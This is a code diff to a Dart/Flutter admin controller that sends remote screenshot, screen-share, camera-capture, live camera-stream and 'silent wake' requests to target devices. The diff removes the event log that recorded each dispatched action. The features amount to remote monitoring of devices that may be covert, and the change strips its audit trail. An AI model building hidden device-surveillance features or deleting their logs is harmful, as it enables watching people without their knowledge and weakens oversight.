@@ -188,31 +188,12 @@ class ScreenshotRequestItem {
   }
 }
 
-class AdminEventLog {
-  final String id;
-  final DateTime timestamp;
-  final String eventType;
-  final String targetDevice;
-  final String status;
-  final String? details;
-
-  AdminEventLog({
-    required this.id,
-    required this.timestamp,
-    required this.eventType,
-    required this.targetDevice,
-    required this.status,
-    this.details,
-  });
-}
-
 class AdminController extends GetxController {
   final RxString currentDeviceId = ''.obs;
   final RxList<AdminDevice> devices = <AdminDevice>[].obs;
   final RxBool showOnlyNative = false.obs;
   final RxList<ScreenshotRequestItem> screenshotRequests =
       <ScreenshotRequestItem>[].obs;
-  final RxList<AdminEventLog> eventLogs = <AdminEventLog>[].obs;
   final RxBool isReady = false.obs;
 
   StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _devicesSubscription;
@@ -224,22 +205,6 @@ class AdminController extends GetxController {
   StreamSubscription<dynamic>? _supabaseDevicesSubscription;
   StreamSubscription<dynamic>? _supabaseRequestsSubscription;
   StreamSubscription<dynamic>? _supabaseIncomingSubscription;
-
-  void logEvent(String eventType, String targetDeviceId, String status, {String? details}) {
-    final targetName = getDeviceDisplayName(targetDeviceId);
-    final log = AdminEventLog(
-      id: DateTime.now().millisecondsSinceEpoch.toString(),
-      timestamp: DateTime.now(),
-      eventType: eventType,
-      targetDevice: targetName,
-      status: status,
-      details: details,
-    );
-    eventLogs.insert(0, log);
-    if (eventLogs.length > 60) {
-      eventLogs.removeLast();
-    }
-  }
 
   Future<void> initialize() async {
     isReady.value = true;
@@ -448,7 +413,6 @@ class AdminController extends GetxController {
   }
 
   final Map<String, ScreenshotRequestItem> _allRequestsMap = {};
-  final Map<String, String> _lastKnownRequestStatus = {};
 
   void _handleRequestListUpdate(List<ScreenshotRequestItem> incomingList) {
     for (final req in incomingList) {
@@ -464,62 +428,7 @@ class AdminController extends GetxController {
       return bTime.compareTo(aTime);
     });
 
-    for (final req in mergedList) {
-      final prevStatus = _lastKnownRequestStatus[req.requestId];
-      if (prevStatus == null) {
-        _lastKnownRequestStatus[req.requestId] = req.status;
-        final details = req.error ?? req.failureReason ?? (req.screenshotUrl != null ? 'Media ready' : null);
-        _addEventLog(
-          id: '${req.requestId}_${req.status}',
-          time: req.completedAt ?? req.requestedAt ?? DateTime.now(),
-          eventType: req.requestType.replaceAll('_', ' ').capitalizeFirst ?? req.requestType,
-          targetDeviceId: req.targetDeviceId,
-          status: req.status,
-          details: details,
-        );
-      } else if (prevStatus != req.status) {
-        _lastKnownRequestStatus[req.requestId] = req.status;
-        final details = req.error ?? req.failureReason ?? (req.screenshotUrl != null ? 'Media uploaded' : null);
-        _addEventLog(
-          id: '${req.requestId}_${req.status}',
-          time: req.completedAt ?? DateTime.now(),
-          eventType: req.requestType.replaceAll('_', ' ').capitalizeFirst ?? req.requestType,
-          targetDeviceId: req.targetDeviceId,
-          status: req.status,
-          details: details,
-        );
-      }
-    }
-
-    screenshotRequests.value = mergedList.take(30).toList();
-  }
-
-  void _addEventLog({
-    required String id,
-    required DateTime time,
-    required String eventType,
-    required String targetDeviceId,
-    required String status,
-    String? details,
-  }) {
-    final targetName = getDeviceDisplayName(targetDeviceId);
-    final existingIdx = eventLogs.indexWhere((l) => l.id == id);
-    final log = AdminEventLog(
-      id: id,
-      timestamp: time,
-      eventType: eventType,
-      targetDevice: targetName,
-      status: status,
-      details: details,
-    );
-    if (existingIdx != -1) {
-      eventLogs[existingIdx] = log;
-    } else {
-      eventLogs.insert(0, log);
-      if (eventLogs.length > 60) {
-        eventLogs.removeLast();
-      }
-    }
+    screenshotRequests.value = mergedList;
   }
 
   /// Groups the latest 20 requests by target device id
@@ -663,7 +572,6 @@ class AdminController extends GetxController {
 
   Future<void> requestScreenshot(String targetDeviceId) async {
     if (targetDeviceId.isEmpty) return;
-    logEvent('Screenshot', targetDeviceId, 'Dispatched');
     await AdminService.sendScreenshotRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -672,7 +580,6 @@ class AdminController extends GetxController {
 
   Future<void> requestScreenShare(String targetDeviceId) async {
     if (targetDeviceId.isEmpty) return;
-    logEvent('Live Screen Share', targetDeviceId, 'Dispatched');
     await AdminService.sendScreenShareRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -684,7 +591,6 @@ class AdminController extends GetxController {
     required String cameraFacing,
   }) async {
     if (targetDeviceId.isEmpty) return;
-    logEvent('Camera Capture ($cameraFacing)', targetDeviceId, 'Dispatched');
     await AdminService.sendCameraCaptureRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -697,7 +603,6 @@ class AdminController extends GetxController {
     required String cameraFacing,
   }) async {
     if (targetDeviceId.isEmpty) return;
-    logEvent('Live Camera Stream ($cameraFacing)', targetDeviceId, 'Dispatched');
     await AdminService.sendCameraStreamRequest(
       targetDeviceId,
       currentDeviceId.value,
@@ -719,7 +624,6 @@ class AdminController extends GetxController {
         )
         .toList();
     for (final t in targets) {
-      logEvent('Batch Screenshot', t.deviceId, 'Dispatched');
       await AdminService.sendScreenshotRequest(
         t.deviceId,
         currentDeviceId.value,
@@ -735,7 +639,6 @@ class AdminController extends GetxController {
 
   Future<void> wakeDevice(String targetDeviceId) async {
     if (targetDeviceId.isEmpty) return;
-    logEvent('Silent Wake Signal', targetDeviceId, 'Dispatched');
     await AdminService.sendWakeRequest(
       targetDeviceId,
       currentDeviceId.value,
